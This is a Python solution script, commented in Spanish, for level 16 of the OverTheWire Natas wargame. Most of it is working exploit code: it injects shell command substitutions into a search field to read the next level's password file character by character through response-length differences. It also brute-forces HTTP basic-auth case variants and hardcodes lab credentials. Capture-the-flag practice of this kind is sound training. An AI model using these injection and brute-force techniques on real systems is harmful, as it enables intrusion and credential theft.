import requests

def iniciar_sesion(username,password,url):
    session = requests.Session()
    r = session.post(url,auth=(username, password))
    return session

#Puede ocurrir que no se identifique cuál es la letra, por lo que puede entregar más de un solo caracters,
#por ejemplo que entrega un par, o una tupla mayor a dos.
def letra(lista):
    iniciales = lista[0].lower()
    for palabra in lista:
        palabra=palabra.lower()
        if len(iniciales)==1:
            print(f"con esta palabra decidí quien es la letra correcta {palabra}, la letra correcta es {iniciales}")
            break
        for character in iniciales:
            if not character in palabra:
                indice = iniciales.find(character)
                iniciales = iniciales[0:indice]+iniciales[indice+1:len(iniciales)]
            else:
                continue
    return iniciales


def get_numbers(username,password,session,url):
    guess_num = {}
    for i in range(0,10):
        payload = {'needle':f'$(echo -r)$(echo {i})'}
        r = session.post(url,auth=(username,password),data=payload)
        guess_num.update({f'{len(r.content)}':f'{i}'})
        print(f"el largo para el numero {i} es {len(r.content)}.")
    l = [8,16,19,24,30]
    for num in l:
        payload = {'needle':f'$(echo -r)$(cut -c {num} /etc/natas_webpass/natas17)'}
        r = session.post(url,auth=(username,password),data=payload)
        print(f"el largo para el numero {num} es {len(r.content)}.")
    return guess_num

def guess_pass(username,password,session,url):
    contador=1
    L=[]
    guess = get_numbers(username,password,session,url)
    while True:
        if contador == 33:
            break
        payload={'needle':f'$(cut -c {contador} /etc/natas_webpass/natas17)'}
        r = session.post(url,auth=(username,password),data=payload)
        index=r.content.find(b"<pre>")
        end=r.content.find(b"</pre>")
        r=r.content[index:end]
        nombres = r.split(b"\n")
        if len(nombres)==2:
            #hay que volver a intentar, pero sumando una cantidad tal que se convierta en un caracter el número
            payload = {'needle':f'$(echo -r)$(cut -c {contador} /etc/natas_webpass/natas17)'}
            r = session.post(url,auth=(username,password),data=payload)
            L.append(guess[str(len(r.content))].encode())
            print(f"el largo para el numero {contador} es {len(r.content)}.")
        else:
            print(f"se encontraron resultados {len(nombres)}")
            L.append(nombres)
        contador+=1
    #nombres es una lista que contiene los resultados de cada request para una caracter de la contraseña
    password = []
    for letras in L:
        if not isinstance(letras,list):
            password.append(letras)
        #hay que sacar el primer y último elemento
        else:
            letras = letras[1:len(letras)-2]
            password.append(letra(letras))
    print(f"la password puede ser{password}")

def real_pass(username,password,guesspass,session,url):
    contador = 0
    final_str = ''
    while True:
        print(f"la password va siendo {final_str}")
        guess = guesspass[contador]
        payload = {'needle':f'$(echo -r)$(grep -c {final_str+guess} /etc/natas_webpass/natas17)'}
        r = session.post(url,auth=(username,password),data=payload)
        if len(r.content) == 4817:
            guess = guesspass[contador].upper()
            payload = {'needle':f'$(echo -r)$(grep -c {final_str+guess} /etc/natas_webpass/natas17)'}
            r = session.post(url,auth=(username,password),data=payload)
        final_str+=guess
        contador+=1
        if contador == 33:
            break

def removeDuplicates(s):
    p = ""
    for char in s:
        if char not in p:
            p = p+char
    return p 

#guesspass es una lista
def real_passv2(username,password,guesspass,session,url):
    contador = 0
    final_str = ''
    while True:
        print(f"la password va siendo {final_str}")
        guess = guesspass[contador]
        #probar con todas las letras
        guess = removeDuplicates(guess)
        if len(guess)>1:
            copy_guess = guess
            for character in copy_guess:    
                payload = {'needle':f'$(echo -r)$(grep -c {final_str+character} /etc/natas_webpass/natas17)'}
                r = session.post(url,auth=(username,password),data=payload)
                if len(r.content) == 4817:
                    payload = {'needle':f'$(echo -r)$(grep -c {final_str+character.upper()} /etc/natas_webpass/natas17)'}
                    r = session.post(url,auth=(username,password),data=payload)
                    if len(r.content) == 4817:
                        continue
                    guess = character
                guess = character
        payload = {'needle':f'$(echo -r)$(grep -c {final_str+guess} /etc/natas_webpass/natas17)'}
        r = session.post(url,auth=(username,password),data=payload)
        if len(r.content) == 4817:
            guess = guess.upper()
            payload = {'needle':f'$(echo -r)$(grep -c {final_str+guess} /etc/natas_webpass/natas17)'}
            r = session.post(url,auth=(username,password),data=payload)
        final_str+=guess
        contador+=1
        if contador == 33:
            break


def write_right(a):
    for i in range(0,len(a)):
        if len(a[i])==2:
            a[i]=chr(a[i][0]).encode()
    password = b''
    for char in a:
        password+=char
    print(f"la posible password es: {password}")

def bruteforce_pass(username,password,url):
    session = requests.Session()
    bin_comb(16,session,username,password,url)

def bin_comb(cantidad,session,username,password,url):
    L=[]
    total = 2 **cantidad
    numb1=f'{0}'*(cantidad-1)+'1'
    #binario=f'{0}'*cantidad
    #se me cayó porque se bloqueó el pc xd
    binario ='0110111010011101'
    print(numb1,binario)
    contador = 0
    while total>0:
        try_pass = cambiar_string(password,binario)
        print(f"el numero binario es {binario}")
        r = session.post(url,auth=(username, try_pass))
        print(f"se intentó con la password {try_pass}, con code {r.status_code}")
        if r.status_code != 401:
            print(f"la contraseña es {try_pass}")
            break
        binario = bin(int(binario, 2) + int(numb1, 2))
        sp = binario.split("b")
        resto = cantidad-(len(sp[1]))
        binario = f'{0}'*resto+sp[1]
        total-=1
        contador+=1


#Sabemos que la forma de la contraseña es xkeuche0sbnkbvh1ru7ksib9uulmi7sd
#Por que lo que con la ayuda de binario, si el bit es 1, la letra se pondrá en mayúscula, caso contrario
#será una minúscula. binario viene de la forma 0b1100
def cambiar_string(password, binario):
    pos_num = []
    for indice in range(0,len(password)):
        #la C es mayus, con la h(h y H),b(b,B y b ),n,l(es L) también funciona, con la s igual,pos 9 S es mayus, pos 21 s, pos 31 s
        if password[indice].isnumeric() or password[indice] == 'C' or password[indice] == 'h' or password[indice] == 'H' or password[indice] == 'b' or password[indice] == 'B' or password[indice] == 'n' or  password[indice] == 'L' or  password[indice] == 's' or  password[indice] == 'S':
            pos_num.append(indice)
    temp_string = ''
    inicio=0
    for pos in pos_num:
        temp_string+=password[inicio:pos]
        inicio = pos+1
    temp_string+=password[pos+1:len(password)]
    L=[]
    for char in temp_string:
        L.append(char)
    contador = 0
    for bit in binario:
        if bit == '1':
            L[contador] = L[contador].upper()
        contador +=1
    inicio = 0
    final_str=''
    contador = 0
    for pos in pos_num:
        L.insert(pos,password[pos])
    final_str="".join(L)
    return final_str




if __name__ == "__main__" :
    username = "natas16"
    password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
    url = "http://natas16.natas.labs.overthewire.org"
    session= iniciar_sesion(username,password,url)
    r= session.post(url,auth=(username, password))
    #veamos elcódigo de error 401
    if b"browser doesn\'t understand how to supply" in r.content:
        print(r.content,r.status_code)
    #get_numbers(username,password,session,url)
    #guess_pass(username,password,session,url)
    #se intento injectando lo sgte  {'needle':f'$(echo -rv)$(cut -c {contador} /etc/natas_webpass/natas17)'
    possible_pass='xkeuche0sbnkbvh1ru7ksib9uulmi7sd'
    #la C es mayus, con la h(h y H),b(b,B y b ),n,l(es L) también funciona, con la s igual,pos 9 S es mayus, pos 21 s, pos 31 s
    #possible_pass = 'xkeuChe0SbnkBvH1ru7ksib9uuLmi7sd'
    #We need to check for all possible upper/lowercase combinations in possible_pass
    username="natas16"
    url = "http://natas16.natas.labs.overthewire.org"
    #era una doble l alksdjflkasd 
    possible_pass = ['e', 'qu', 'j', 'h', 'j', 'b', 'o', '7', 'll', 'f', 'n', 'b', '8', 'v', 'w', 'h', 'h', 'b', '9', 's', '7', '5', 'h', 'o', 'k', 'h', '5', 't', 'f', '0', 'o', 'c']
    real_passv2(username,password,possible_pass,session,url)
    #LA FINAL PASSWORD ES XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
    #bruteforce_pass(username,possible_pass,url)
    #cambiar_string(possible_pass,['1','1','1','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','1'])



